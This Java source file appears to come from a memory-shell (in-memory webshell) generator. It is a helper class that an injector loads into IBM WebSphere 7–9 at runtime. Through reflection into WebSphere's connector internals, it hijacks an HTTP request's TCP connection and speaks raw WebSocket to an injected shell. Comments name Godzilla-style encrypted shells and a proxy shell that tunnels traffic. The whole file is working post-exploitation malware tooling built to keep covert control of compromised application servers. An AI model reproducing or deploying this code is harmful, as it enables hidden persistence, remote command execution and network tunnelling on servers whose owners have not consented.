package com.reajason.javaweb.memshell.server.websphere;

import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InterruptedIOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.SocketTimeoutException;
import java.nio.charset.Charset;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Map;

/**
 * WebSphere（传统 WAS 7/8.5/9）RawWebSocket helper 模板。
 * <p>
 * 生成期由 server 按 {@code <shellClassName>$RawWsHelper} 重命名并嵌入注入器；注入器先
 * defineClass 本类，再实例化 shell。shell 每次握手创建一个 helper 实例，调用
 * {@code helper.equals(new Object[]{request, response, this})} 后由本类接管连接。
 * <p>
 * 连接获取链：{@code SRTServletRequest#getIRequest()} → {@code WCCRequestImpl.isc}
 * （{@code HttpInboundServiceContext}）→ {@code getTSC()}（{@code TCPConnectionContext}）
 * → 读写上下文。握手和帧都直接写连接器 socket，不经过 WebContainer 的响应缓冲，因此
 * 不依赖 Servlet 3.1 的 {@code HttpUpgradeHandler}，WAS 7 也能用。
 * <p>
 * 本类只依赖 JDK（目标 JDK 6），不引用任何 servlet 或 IBM 类型。
 *
 * @author ReaJason
 */
public class WebSphereRawWsHelper implements Runnable {

    private static final String GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    private static final Charset UTF8 = Charset.forName("UTF-8");
    private static final int MAX_MESSAGE_SIZE = 50 * 1024 * 1024;
    private static final int OP_CONT = 0x0;
    private static final int OP_TEXT = 0x1;
    private static final int OP_BINARY = 0x2;
    private static final int OP_CLOSE = 0x8;
    private static final int OP_PING = 0x9;
    private static final int OP_PONG = 0xA;

    private static final int READ_BUFFER_SIZE = 8192;
    /**
     * 阻塞读的超时：连接空闲时定期醒来检查 closed，让泵线程关闭的连接能退出帧循环。
     */
    private static final int READ_POLL_TIMEOUT = 5000;
    private static final int WRITE_TIMEOUT = 5000;

    private Object serviceContext;
    private Object tcpConnection;
    private Object readContext;
    private Object writeContext;
    private Object bufferManager;
    private Object readBuffer;
    private Class bufferClass;

    /**
     * 帧读写热路径每帧要十几次 getMethod，connect 阶段按运行时类缓存；个别 WAS
     * fix level 缺席的方法保持 null，热路径回退到按次查找，行为与旧实现一致。
     */
    private Method readContextReadMethod;
    private Method readContextSetBufferMethod;
    private Method writeContextWriteMethod;
    private Method writeContextSetBufferMethod;
    private Method bufferWrapMethod;
    private Method bufferClearMethod;
    private Method bufferLimitMethod;
    private Method bufferPositionMethod;
    private Method bufferGetMethod;
    private Method readDataAvailableMethod;
    private Method getReadBufferMethod;
    private Method releaseMethod;
    private Class releaseMethodOwner;

    private byte[] pending;
    private int pendingIndex;

    private final Object writeLock = new Object();
    private volatile boolean closed;
    private boolean hijacked;
    private boolean disconnectNotified;

    private Object shell;
    private Method onStart;
    private Method onReadBinary;
    private Method onReadText;
    private Method onDisconnect;

    private InputStream pumpInput;
    private Map attributes;

    public WebSphereRawWsHelper() {
    }

    /**
     * 注入器到 helper 的唯一入口。返回 true 表示连接已被接管（101 已决定写或已写），
     * 调用方不能再回落到 FilterChain；返回 false 表示尚未接管，可安全 fallback。
     */
    @Override
    public boolean equals(Object obj) {
        if (!(obj instanceof Object[])) {
            return false;
        }
        Object[] args = (Object[]) obj;
        if (args.length != 3) {
            return false;
        }
        try {
            return connect(args[0], args[1], args[2]);
        } catch (Throwable ignored) {
            return hijacked;
        }
    }

    private boolean connect(Object request, Object response, Object shellObject) throws Exception {
        if (request == null || response == null) {
            return false;
        }
        Object key = invoke(request, "getHeader", new Class[]{String.class},
                new Object[]{"Sec-WebSocket-Key"});
        Object method = invoke(request, "getMethod", new Class[0], null);
        if (!(key instanceof String) || !"GET".equalsIgnoreCase(String.valueOf(method))) {
            return false;
        }
        String accept = acceptKey((String) key);
        if (accept == null) {
            return false;
        }
        if (Boolean.TRUE.equals(invoke(response, "isCommitted", new Class[0], null))) {
            return false;
        }
        Object isc = findServiceContext(request);
        if (isc == null) {
            return false;
        }
        Object tcp = invoke(isc, "getTSC", new Class[0], null);
        if (tcp == null) {
            Object link = invoke(isc, "getLink", new Class[0], null);
            tcp = getField(link, "myTSC");
        }
        if (tcp == null) {
            return false;
        }
        Object reader = invoke(tcp, "getReadInterface", new Class[0], null);
        Object writer = invoke(tcp, "getWriteInterface", new Class[0], null);
        if (reader == null || writer == null) {
            return false;
        }
        Object manager = findBufferManager(tcp);
        Class bufClass = findBufferClass(reader, manager);
        if (manager == null || bufClass == null) {
            return false;
        }
        Object buffer = invoke(manager, "allocate", new Class[]{int.class},
                new Object[]{Integer.valueOf(READ_BUFFER_SIZE)});
        if (buffer == null) {
            return false;
        }

        this.serviceContext = isc;
        this.tcpConnection = tcp;
        this.readContext = reader;
        this.writeContext = writer;
        this.bufferManager = manager;
        this.bufferClass = bufClass;
        this.readBuffer = buffer;
        this.shell = shellObject;
        this.onStart = findMethod(shellObject, "onStart", new Class[]{Object.class});
        this.onReadBinary = findMethod(shellObject, "onReadBinary",
                new Class[]{Object.class, byte[].class});
        this.onReadText = findMethod(shellObject, "onReadText",
                new Class[]{Object.class, String.class});
        this.onDisconnect = findMethod(shellObject, "onDisconnect", new Class[]{Object.class});
        initMethods();

        this.hijacked = true;
        try {
            writeHandshake(accept);
        } catch (Throwable ignored) {
            // onStart 尚未回调，这里只能关连接，走 disconnect() 会对从未开始的
            // 会话触发 onDisconnect（Godzilla 的 AES 状态、Proxy 的目标连接会被误清）
            closeConnection();
            releaseReadBuffer();
            return true;
        }
        invokeQuietly(onStart, shell, new Object[]{this});
        try {
            frameLoop();
        } catch (Throwable ignored) {
        } finally {
            disconnect();
            releaseReadBuffer();
        }
        return true;
    }

    /**
     * connect 阶段解析并缓存热路径反射方法。缺席的方法保持 null 由调用点回退
     * 按次查找；唯独 isReadDataAvailable 缺席时按无剩余数据处理（不再逐次尝试），
     * 并告警说明该 WAS 版本未验证 buffered-drain，避免会话无声挂死。
     */
    private void initMethods() {
        readContextReadMethod = findMethod(readContext, "read", new Class[]{long.class, int.class});
        readContextSetBufferMethod = findMethod(readContext, "setBuffer", new Class[]{bufferClass});
        writeContextWriteMethod = findMethod(writeContext, "write", new Class[]{long.class, int.class});
        writeContextSetBufferMethod = findMethod(writeContext, "setBuffer", new Class[]{bufferClass});
        bufferWrapMethod = findMethod(bufferManager, "wrap", new Class[]{byte[].class});
        bufferClearMethod = findMethod(readBuffer, "clear", new Class[0]);
        bufferLimitMethod = findMethod(readBuffer, "limit", new Class[]{int.class});
        bufferPositionMethod = findMethod(readBuffer, "position", new Class[]{int.class});
        bufferGetMethod = findMethod(readBuffer, "get", new Class[]{byte[].class, int.class, int.class});
        readDataAvailableMethod = findMethod(serviceContext, "isReadDataAvailable", new Class[0]);
        getReadBufferMethod = findMethod(serviceContext, "getReadBuffer", new Class[0]);
        if (readDataAvailableMethod == null) {
            System.err.println("WebSphereRawWsHelper: " + serviceContext.getClass().getName()
                    + "#isReadDataAvailable() not found, buffered-drain is not verified"
                    + " on this WAS version");
        }
    }

    /**
     * WebSphere 的请求/响应对象层层包装：标准 wrapper 用 getRequest()，SRT 请求用
     * getIRequest()，WCCRequestImpl 才持有 HttpInboundServiceContext。
     */
    private static Object findServiceContext(Object request) {
        Object current = request;
        for (int depth = 0; depth < 10 && current != null; depth++) {
            Object isc = getField(current, "isc");
            if (isc != null && findMethod(isc, "getTSC", new Class[0]) != null) {
                return isc;
            }
            Object iRequest = invoke(current, "getIRequest", new Class[0], null);
            if (iRequest == null || iRequest == current) {
                iRequest = getField(current, "_request");
            }
            if (iRequest != null && iRequest != current) {
                current = iRequest;
                continue;
            }
            Object next = invoke(current, "getRequest", new Class[0], null);
            if (next == null || next == current) {
                return null;
            }
            current = next;
        }
        return null;
    }

    /**
     * 缓冲区管理器和 HTTP/TCP 通道同源：com.ibm.ws.buffermgmt.impl.WsByteBufferPoolManagerImpl
     * 是 ibmcfw.jar 里的单例。按通道对象的类加载器优先查找，避免 webapp loader 的可见性差异。
     */
    private static Object findBufferManager(Object tcp) {
        String name = "com.ibm.ws.buffermgmt.impl.WsByteBufferPoolManagerImpl";
        ClassLoader[] loaders = new ClassLoader[]{
                tcp.getClass().getClassLoader(),
                Thread.currentThread().getContextClassLoader(),
                WebSphereRawWsHelper.class.getClassLoader()
        };
        for (int i = 0; i < loaders.length; i++) {
            Object manager = getBufferManager(name, loaders[i]);
            if (manager != null) {
                return manager;
            }
        }
        return getBufferManager(name, null);
    }

    private static Object getBufferManager(String className, ClassLoader loader) {
        try {
            Class clazz = loader == null ? Class.forName(className)
                    : Class.forName(className, true, loader);
            return clazz.getMethod("getRef", new Class[0]).invoke(null);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static Class findBufferClass(Object readContext, Object manager) {
        try {
            Class clazz = Class.forName("com.ibm.wsspi.buffermgmt.WsByteBuffer", false,
                    readContext.getClass().getClassLoader());
            if (clazz != null) {
                return clazz;
            }
        } catch (Throwable ignored) {
        }
        if (manager != null) {
            try {
                Class clazz = Class.forName("com.ibm.wsspi.buffermgmt.WsByteBuffer", false,
                        manager.getClass().getClassLoader());
                if (clazz != null) {
                    return clazz;
                }
            } catch (Throwable ignored) {
            }
        }
        return null;
    }

    // ---------------------------------------------------------------- 协议

    private void writeHandshake(String accept) throws IOException {
        String response = "HTTP/1.1 101 Switching Protocols\r\n"
                + "Upgrade: websocket\r\n"
                + "Connection: Upgrade\r\n"
                + "X-Accel-Buffering: no\r\n"
                + "Sec-WebSocket-Accept: " + accept + "\r\n"
                + "\r\n";
        byte[] data = response.getBytes(UTF8);
        synchronized (writeLock) {
            writeWire(data, 0, data.length);
        }
    }

    private void frameLoop() {
        ByteArrayOutputStream fragments = null;
        int fragmentOpcode = -1;
        try {
            while (!closed) {
                int b1 = readWireByte();
                if (b1 == -1) {
                    break;
                }
                boolean fin = (b1 & 0x80) != 0;
                int opcode = b1 & 0x0F;
                if ((b1 & 0x70) != 0) {
                    closeWith(1002, "unexpected reserved bits");
                    return;
                }

                int b2 = readWireByte();
                if (b2 == -1) {
                    break;
                }
                boolean masked = (b2 & 0x80) != 0;
                long length = b2 & 0x7F;
                if (length == 126) {
                    int hi = readWireByte();
                    int lo = readWireByte();
                    // EOF 时直接结束：-1 折进长度算术会算出畸形长度
                    if (hi < 0 || lo < 0) {
                        return;
                    }
                    length = (hi << 8) | lo;
                } else if (length == 127) {
                    length = 0;
                    for (int i = 0; i < 8; i++) {
                        int b = readWireByte();
                        if (b < 0) {
                            return;
                        }
                        length = (length << 8) | b;
                    }
                }
                if (length < 0 || length > MAX_MESSAGE_SIZE) {
                    closeWith(1009, "message too big");
                    return;
                }
                if (!masked) {
                    closeWith(1002, "client frame must be masked");
                    return;
                }
                if (opcode >= 0x8 && (!fin || length > 125)) {
                    closeWith(1002, "invalid control frame");
                    return;
                }

                byte[] mask = new byte[4];
                readFully(mask, 0, mask.length);
                byte[] message = readMaskedPayload(length, mask);

                if (opcode == OP_CLOSE) {
                    // RFC 6455 §5.5：Close 负载长度只能是 0 或 >=2
                    if (message.length == 1) {
                        closeWith(1002, "invalid close payload");
                        return;
                    }
                    sendFrame(OP_CLOSE, message);
                    disconnect();
                    return;
                }
                if (opcode == OP_PING) {
                    sendFrame(OP_PONG, message);
                    continue;
                }
                if (opcode == OP_PONG) {
                    continue;
                }
                if (opcode == OP_CONT) {
                    if (fragments == null) {
                        closeWith(1002, "unexpected continuation");
                        return;
                    }
                    fragments.write(message);
                    if (fragments.size() > MAX_MESSAGE_SIZE) {
                        closeWith(1009, "message too big");
                        return;
                    }
                    if (fin) {
                        dispatch(fragmentOpcode, fragments.toByteArray());
                        fragments = null;
                        fragmentOpcode = -1;
                    }
                    continue;
                }
                if (opcode == OP_TEXT || opcode == OP_BINARY) {
                    if (fragments != null) {
                        closeWith(1002, "expected continuation");
                        return;
                    }
                    if (fin) {
                        dispatch(opcode, message);
                    } else {
                        fragmentOpcode = opcode;
                        fragments = new ByteArrayOutputStream();
                        fragments.write(message);
                    }
                    continue;
                }
                closeWith(1002, "unknown opcode");
                return;
            }
        } catch (Throwable ignored) {
        }
    }

    /**
     * 不能按帧头声明长度立即分配整块数组（恶意帧头声明 50MB 但不发数据即可耗尽堆），
     * 分块读入随数据增长；掩码按全局偏移应用。length 为 0 时直接返回空数组。
     */
    private byte[] readMaskedPayload(long length, byte[] mask) throws IOException {
        int total = (int) length;
        int chunkSize = Math.min(total, READ_BUFFER_SIZE);
        ByteArrayOutputStream out = new ByteArrayOutputStream(chunkSize);
        byte[] chunk = new byte[chunkSize];
        int received = 0;
        while (received < total) {
            int n = Math.min(chunkSize, total - received);
            readFully(chunk, 0, n);
            for (int i = 0; i < n; i++) {
                chunk[i] = (byte) (chunk[i] ^ mask[(received + i) % 4]);
            }
            out.write(chunk, 0, n);
            received += n;
        }
        return out.toByteArray();
    }

    private void dispatch(int opcode, byte[] message) {
        if (opcode == OP_TEXT) {
            invokeQuietly(onReadText, shell, new Object[]{this, new String(message, UTF8)});
        } else {
            invokeQuietly(onReadBinary, shell, new Object[]{this, message});
        }
    }

    public void sendText(String text) {
        sendFrame(OP_TEXT, text.getBytes(UTF8));
    }

    public void sendBinary(byte[] data) {
        sendFrame(OP_BINARY, data);
    }

    /**
     * 供壳主动结束会话（如代理建连失败）：发送 Close 帧并释放底层连接。
     */
    public void close() {
        closeWith(1000, null);
    }

    private void sendFrame(int opcode, byte[] data) {
        synchronized (writeLock) {
            if (closed || writeContext == null) {
                return;
            }
            try {
                int length = data.length;
                byte[] header;
                if (length <= 125) {
                    header = new byte[]{0, (byte) length};
                } else if (length <= 0xFFFF) {
                    header = new byte[]{0, 126, (byte) ((length >>> 8) & 0xFF), (byte) (length & 0xFF)};
                } else {
                    header = new byte[10];
                    header[1] = 127;
                    for (int i = 0; i < 8; i++) {
                        header[9 - i] = (byte) (((long) length >>> (8 * i)) & 0xFF);
                    }
                }
                header[0] = (byte) (0x80 | opcode);
                writeWire(header, 0, header.length);
                writeWire(data, 0, data.length);
            } catch (Throwable t) {
                closeConnection();
            }
        }
    }

    private void closeWith(int code, String reason) {
        byte[] reasonBytes = reason == null ? new byte[0] : reason.getBytes(UTF8);
        byte[] data = new byte[2 + reasonBytes.length];
        data[0] = (byte) ((code >>> 8) & 0xFF);
        data[1] = (byte) (code & 0xFF);
        System.arraycopy(reasonBytes, 0, data, 2, reasonBytes.length);
        sendFrame(OP_CLOSE, data);
        disconnect();
    }

    public Object getAttribute(String name) {
        Map map = attributes;
        return map == null ? null : map.get(name);
    }

    public void setAttribute(String name, Object value) {
        if (attributes == null) {
            attributes = new HashMap();
        }
        if (value == null) {
            attributes.remove(name);
        } else {
            attributes.put(name, value);
        }
    }

    /**
     * 为 Proxy 壳提供目标端到客户端的异步泵送。
     */
    public void startPump(InputStream targetInput) {
        if (targetInput == null) {
            return;
        }
        this.pumpInput = targetInput;
        Thread thread = new Thread(this, "rawws-pump");
        thread.setDaemon(true);
        thread.setContextClassLoader(getClass().getClassLoader());
        thread.start();
    }

    @Override
    public void run() {
        InputStream targetInput = pumpInput;
        if (targetInput == null) {
            return;
        }
        byte[] buffer = new byte[8192];
        try {
            while (!closed) {
                int count = targetInput.read(buffer);
                if (count == -1) {
                    break;
                }
                if (count > 0) {
                    byte[] data = new byte[count];
                    System.arraycopy(buffer, 0, data, 0, count);
                    sendBinary(data);
                }
            }
        } catch (Throwable ignored) {
        }
        closeWith(1000, null);
    }

    // ---------------------------------------------------------------- 原始字节读写

    private int readWireByte() throws IOException {
        while (!closed) {
            if (pending != null && pendingIndex < pending.length) {
                return pending[pendingIndex++] & 0xFF;
            }
            int count = fillReadBuffer();
            if (count < 0) {
                return -1;
            }
        }
        return -1;
    }

    private void readFully(byte[] buffer, int offset, int length) throws IOException {
        int read = 0;
        while (read < length) {
            if (pending == null || pendingIndex >= pending.length) {
                int count = fillReadBuffer();
                if (count < 0) {
                    throw new EOFException("unexpected EOF");
                }
                continue;
            }
            int count = Math.min(length - read, pending.length - pendingIndex);
            System.arraycopy(pending, pendingIndex, buffer, offset + read, count);
            pendingIndex += count;
            read += count;
        }
    }

    /**
     * TCPReadRequestContext#read(amount, timeout) 的 amount 是“读满多少字节才算完成”的门槛：
     * 传缓冲区大小会在小帧场景下一直等不到完成，超时后 AIO 已经读到的部分字节也不会
     * 反映到缓冲区（updateIOCounts/postProcessReadBuffers 只在完成后调用）。
     * 传 1 表示只要 socket 上有数据就返回本次实际读到的字节数；没有数据则超时返回，
     * 外层继续轮询并检查 closed。
     */
    private int fillReadBuffer() throws IOException {
        while (!closed) {
            if (drainHttpBuffers()) {
                return pending.length;
            }
            try {
                invokeCached(readBuffer, bufferClearMethod, "clear", new Class[0], null);
                invokeCached(readContext, readContextSetBufferMethod, "setBuffer",
                        new Class[]{bufferClass}, new Object[]{readBuffer});
                Object result = invokeRequiredCached(readContext, readContextReadMethod, "read",
                        new Class[]{long.class, int.class},
                        new Object[]{Long.valueOf(1L), Integer.valueOf(READ_POLL_TIMEOUT)});
                long count = result instanceof Long ? ((Long) result).longValue() : -1L;
                if (count < 0) {
                    return -1;
                }
                if (count == 0) {
                    continue;
                }
                int size = (int) Math.min(count, READ_BUFFER_SIZE);
                invokeCached(readBuffer, bufferLimitMethod, "limit", new Class[]{int.class},
                        new Object[]{Integer.valueOf(size)});
                invokeCached(readBuffer, bufferPositionMethod, "position", new Class[]{int.class},
                        new Object[]{Integer.valueOf(0)});
                byte[] data = new byte[size];
                invokeRequiredCached(readBuffer, bufferGetMethod, "get",
                        new Class[]{byte[].class, int.class, int.class},
                        new Object[]{data, Integer.valueOf(0), Integer.valueOf(size)});
                this.pending = data;
                this.pendingIndex = 0;
                return size;
            } catch (InvocationTargetException e) {
                Throwable cause = e.getCause();
                if (isTimeout(cause)) {
                    if (Thread.currentThread().isInterrupted()) {
                        return -1;
                    }
                    continue;
                }
                if (closed) {
                    return -1;
                }
                if (cause instanceof IOException) {
                    throw (IOException) cause;
                }
                throw new IOException("websphere read failed: " + cause);
            }
        }
        return -1;
    }

    /**
     * 握手请求被 WebContainer 解析时，连接器可能已经把紧随其后的 WebSocket 帧读进了
     * HTTP 自己的读缓冲（currentReadBB / myParseBuffers）。直接读 TCP 会永远等不到这些
     * 已经离开 socket 的字节，所以先把 HTTP 侧的剩余数据搬过来，再退回 TCP 读。
     */
    private boolean drainHttpBuffers() {
        boolean any = false;
        while (!closed) {
            // 方法缺席的 WAS 版本已在 initMethods 告警，按无剩余数据处理
            if (readDataAvailableMethod == null) {
                break;
            }
            Object available = invokeCached(serviceContext, readDataAvailableMethod,
                    "isReadDataAvailable", new Class[0], null);
            if (!Boolean.TRUE.equals(available)) {
                break;
            }
            Object buffer = invokeCached(serviceContext, getReadBufferMethod,
                    "getReadBuffer", new Class[0], null);
            if (buffer == null) {
                break;
            }
            Object remaining = invoke(buffer, "remaining", new Class[0], null);
            int size = remaining instanceof Integer ? ((Integer) remaining).intValue() : 0;
            if (size <= 0) {
                break;
            }
            byte[] data = new byte[size];
            Object got = invoke(buffer, "get",
                    new Class[]{byte[].class, int.class, int.class},
                    new Object[]{data, Integer.valueOf(0), Integer.valueOf(size)});
            if (got == null) {
                break;
            }
            appendPending(data, size);
            any = true;
        }
        return any;
    }

    private void appendPending(byte[] data, int size) {
        int left = pending == null ? 0 : pending.length - pendingIndex;
        byte[] merged = new byte[left + size];
        if (left > 0) {
            System.arraycopy(pending, pendingIndex, merged, 0, left);
        }
        System.arraycopy(data, 0, merged, left, size);
        this.pending = merged;
        this.pendingIndex = 0;
    }

    private void writeWire(byte[] data, int offset, int length) throws IOException {
        if (length <= 0) {
            return;
        }
        Object buffer = null;
        try {
            byte[] bytes = data;
            if (offset != 0 || length != data.length) {
                bytes = new byte[length];
                System.arraycopy(data, offset, bytes, 0, length);
            }
            buffer = invokeRequiredCached(bufferManager, bufferWrapMethod, "wrap",
                    new Class[]{byte[].class}, new Object[]{bytes});
            invokeRequiredCached(writeContext, writeContextSetBufferMethod, "setBuffer",
                    new Class[]{bufferClass}, new Object[]{buffer});
            Object result = invokeRequiredCached(writeContext, writeContextWriteMethod, "write",
                    new Class[]{long.class, int.class},
                    new Object[]{Long.valueOf(-1L), Integer.valueOf(WRITE_TIMEOUT)});
            long count = result instanceof Long ? ((Long) result).longValue() : -1L;
            if (count < 0) {
                throw new IOException("websphere write failed: " + count);
            }
        } catch (InvocationTargetException e) {
            if (closed) {
                throw new IOException("connection closed");
            }
            Throwable cause = e.getCause();
            if (cause instanceof IOException) {
                throw (IOException) cause;
            }
            throw new IOException("websphere write failed: " + cause);
        } finally {
            invokeCached(writeContext, writeContextSetBufferMethod, "setBuffer",
                    new Class[]{bufferClass}, new Object[]{null});
            release(buffer);
        }
    }

    private static boolean isTimeout(Throwable cause) {
        if (cause == null) {
            return false;
        }
        if (cause instanceof SocketTimeoutException) {
            return true;
        }
        if (cause instanceof InterruptedIOException
                && !Thread.currentThread().isInterrupted()) {
            return true;
        }
        String name = cause.getClass().getName();
        return name.endsWith("SocketTimeoutException") || name.endsWith("ReadTimeoutException");
    }

    private void release(Object buffer) {
        if (buffer == null) {
            return;
        }
        try {
            // wrap 出来的写缓冲和 allocate 的读缓冲运行时类未必相同，缓存按属主类校验
            Method method = releaseMethod;
            if (method == null || buffer.getClass() != releaseMethodOwner) {
                method = buffer.getClass().getMethod("release", new Class[0]);
                releaseMethod = method;
                releaseMethodOwner = buffer.getClass();
            }
            method.invoke(buffer);
        } catch (Throwable ignored) {
        }
    }

    private void disconnect() {
        if (disconnectNotified) {
            return;
        }
        disconnectNotified = true;
        if (!hijacked) {
            return;
        }
        invokeQuietly(onDisconnect, shell, new Object[]{this});
        closeConnection();
    }

    private void closeConnection() {
        if (closed) {
            return;
        }
        closed = true;
        invokeCached(readContext, readContextSetBufferMethod, "setBuffer",
                new Class[]{bufferClass}, new Object[]{null});
        synchronized (writeLock) {
            invokeCached(writeContext, writeContextSetBufferMethod, "setBuffer",
                    new Class[]{bufferClass}, new Object[]{null});
        }
        // 只关 socket，不调用 TCPConnLink.destroy：destroy 会把 link 归还连接池，
        // 而 WebContainer 还持有它去完成这次请求的响应，紧接着的新连接复用该 link 后
        // 旧响应会被写到新连接上。让容器之后按正常响应完成流程自行回收 link。
        Object socketIOChannel = invoke(tcpConnection, "getSocketIOChannel", new Class[0], null);
        if (socketIOChannel != null) {
            invoke(socketIOChannel, "close", new Class[0], null);
        }
    }

    /**
     * 读缓冲由发起读的请求线程在帧循环结束后释放。泵线程（Proxy）可能先一步关闭连接，
     * 此时请求线程还阻塞在同一次 AIO 读里，提前 release 会让 native 层写到已归还的
     * 缓冲上，所以关闭连接只摘除引用，释放留给读线程。
     */
    private void releaseReadBuffer() {
        Object buffer = readBuffer;
        this.readBuffer = null;
        release(buffer);
    }

    // ---------------------------------------------------------------- 反射工具

    private static Object getField(Object target, String name) {
        if (target == null) {
            return null;
        }
        Class clazz = target.getClass();
        while (clazz != null && clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(target);
            } catch (NoSuchFieldException ignored) {
                clazz = clazz.getSuperclass();
            } catch (Throwable ignored) {
                return null;
            }
        }
        return null;
    }

    private static Object invoke(Object target, String name, Class[] parameterTypes, Object[] args) {
        if (target == null) {
            return null;
        }
        try {
            Method method = target.getClass().getMethod(name, parameterTypes);
            return method.invoke(target, args);
        } catch (Throwable ignored) {
            return null;
        }
    }

    /**
     * 热路径调用：优先用 connect 阶段缓存的 Method，缓存缺失时回退到按次查找。
     */
    private static Object invokeCached(Object target, Method cached, String name,
                                       Class[] parameterTypes, Object[] args) {
        if (cached != null) {
            try {
                return cached.invoke(target, args);
            } catch (Throwable ignored) {
                return null;
            }
        }
        return invoke(target, name, parameterTypes, args);
    }

    /**
     * invokeRequired 的缓存版本，语义与 {@link #invokeRequired} 一致。
     */
    private static Object invokeRequiredCached(Object target, Method cached, String name,
                                               Class[] parameterTypes, Object[] args)
            throws InvocationTargetException {
        if (cached != null) {
            try {
                return cached.invoke(target, args);
            } catch (InvocationTargetException e) {
                throw e;
            } catch (Throwable t) {
                throw new InvocationTargetException(t);
            }
        }
        return invokeRequired(target, name, parameterTypes, args);
    }

    /**
     * 需要区分“返回 null”和“方法不存在”的调用点：缓冲区和 TCP 读写是接管的前提，
     * 任何一步缺失都应该让 connect 返回 false，而不是带着半初始化状态继续。
     */
    private static Object invokeRequired(Object target, String name, Class[] parameterTypes,
                                         Object[] args) throws InvocationTargetException {
        if (target == null) {
            throw new InvocationTargetException(new NoSuchMethodException(name));
        }
        try {
            Method method = target.getClass().getMethod(name, parameterTypes);
            return method.invoke(target, args);
        } catch (InvocationTargetException e) {
            throw e;
        } catch (Throwable t) {
            throw new InvocationTargetException(t);
        }
    }

    private static Method findMethod(Object target, String name, Class[] parameterTypes) {
        if (target == null) {
            return null;
        }
        try {
            return target.getClass().getMethod(name, parameterTypes);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static void invokeQuietly(Method method, Object target, Object[] args) {
        if (method == null) {
            return;
        }
        try {
            method.invoke(target, args);
        } catch (Throwable ignored) {
        }
    }

    private static String acceptKey(String key) {
        try {
            MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
            return base64Encode(sha1.digest((key + GUID).getBytes(UTF8)));
        } catch (Throwable ignored) {
            return null;
        }
    }

    /**
     * WAS 7 目标 JDK 6 没有 java.util.Base64，IBM J9 也不保证有 sun.misc.BASE64Encoder；
     * 握手只编码 20 字节摘要，直接实现一份，避免运行时类可见性问题。
     */
    private static String base64Encode(byte[] data) {
        char[] table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".toCharArray();
        StringBuilder builder = new StringBuilder((data.length + 2) / 3 * 4);
        for (int i = 0; i < data.length; i += 3) {
            int b0 = data[i] & 0xFF;
            int b1 = i + 1 < data.length ? data[i + 1] & 0xFF : 0;
            int b2 = i + 2 < data.length ? data[i + 2] & 0xFF : 0;
            builder.append(table[b0 >>> 2]);
            builder.append(table[((b0 & 0x03) << 4) | (b1 >>> 4)]);
            builder.append(i + 1 < data.length
                    ? table[((b1 & 0x0F) << 2) | (b2 >>> 6)] : '=');
            builder.append(i + 2 < data.length ? table[b2 & 0x3F] : '=');
        }
        return builder.toString();
    }
}
